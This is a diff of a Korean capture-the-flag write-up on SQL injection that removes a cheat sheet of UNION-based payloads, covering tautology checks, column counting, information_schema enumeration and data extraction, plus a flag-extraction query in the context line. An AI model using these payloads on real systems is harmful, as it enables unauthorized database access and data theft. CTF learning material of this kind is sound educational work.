@@ -88,16 +88,6 @@ normaltic' UNION SELECT idx,flag,3,4 FROM plusFlag_Table --
 ✅ 두 번째 플래그 후보도 발견
 
 
-## 치트시트 정리 
-| 🧩 목적 | 💻 명령어 예시 |
-|--------|----------------|
-| **SQLi 여부 확인** | `' OR '1'='1-- ` |
-| **컬럼 수 확인** | `' ORDER BY 1-- ` |
-| **UNION SELECT 테스트** | `' UNION SELECT 1,2,3,4--ㅡ` |
-| **현재 DB 이름 확인** | `' UNION SELECT database(),2,3,4-- ` |
-| **테이블 이름 추출** | `' UNION SELECT table_name,2,3,4 FROM information_schema.tables WHERE table_schema='{데이터베이스 명}'-- ` |
-| **컬럼 이름 추출** | `' UNION SELECT column_name,2,3,4 FROM information_schema.columns WHERE table_name='{테이블 명}'-- ` |
-| **데이터 추출** | `' UNION SELECT {컬럼 명},2,3,4 FROM {테이블 명}-- ` |
 
 
 
